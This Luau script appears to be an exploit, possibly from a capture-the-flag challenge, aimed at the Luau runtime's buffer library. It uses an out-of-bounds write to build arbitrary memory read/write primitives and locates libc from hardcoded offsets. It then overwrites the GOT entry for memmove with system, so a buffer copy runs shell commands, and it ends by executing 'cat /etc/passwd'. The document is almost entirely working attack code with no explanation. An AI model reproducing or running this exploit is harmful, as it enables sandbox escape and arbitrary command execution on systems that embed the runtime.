--!optimize 0
local calloc: (number) -> buffer = buffer.create;
local memcpy: (buffer, number, buffer, number?, number?) -> () = buffer.copy;
local memory_getaddr = function(operand: any): number
    return tonumber(tostring(operand):match("0x(%x+)"), 16) :: number;
end;
local memory_read: (number) -> number; local memory_write: (number, number) -> (); do
    local first_buffer: buffer = calloc(8);
    local second_buffer: buffer = calloc(8);
    local offset: number = memory_getaddr(second_buffer) + 8;
    memory_read = function(memory_address: number): number
        return buffer.readu32(second_buffer, memory_address - offset) + buffer.readu32(second_buffer, memory_address - offset + 4) * 0x100000000;
    end;
    memory_write = function(memory_address: number, operand: number): ()
        buffer.writeu32(first_buffer, -20, 0x7FFFFFFF);
        local mem_loc: number = memory_address - offset;
        buffer.writeu32(second_buffer, mem_loc, operand % 0x100000000);
        buffer.writeu32(second_buffer, mem_loc + 4, math.floor(operand / 0x100000000));
        return;
    end;
end;
local got_overwrite = function(): ()
    local print_address: number = memory_getaddr(print);
    local a: number = memory_read(print_address + 24);
    local base_address: number = a - a % 0x1000 - 1828 * 0x1000;
    local free: number = memory_read(base_address + 0x9ECE50);
    local libc: number = free - 0xBEBA0;
    local system: number = libc + 0x5E6F0;
    local memmove: number = base_address + 0x9ED130;
    memory_write(memmove, system);
    return;
end;
got_overwrite();
local system = function(command_str: string): ()
    local command_buffer: buffer = buffer.fromstring(command_str);
    local dummy_buffer: buffer = calloc(0);
    return memcpy(command_buffer, 0, dummy_buffer)
end;
system("cat /etc/passwd");

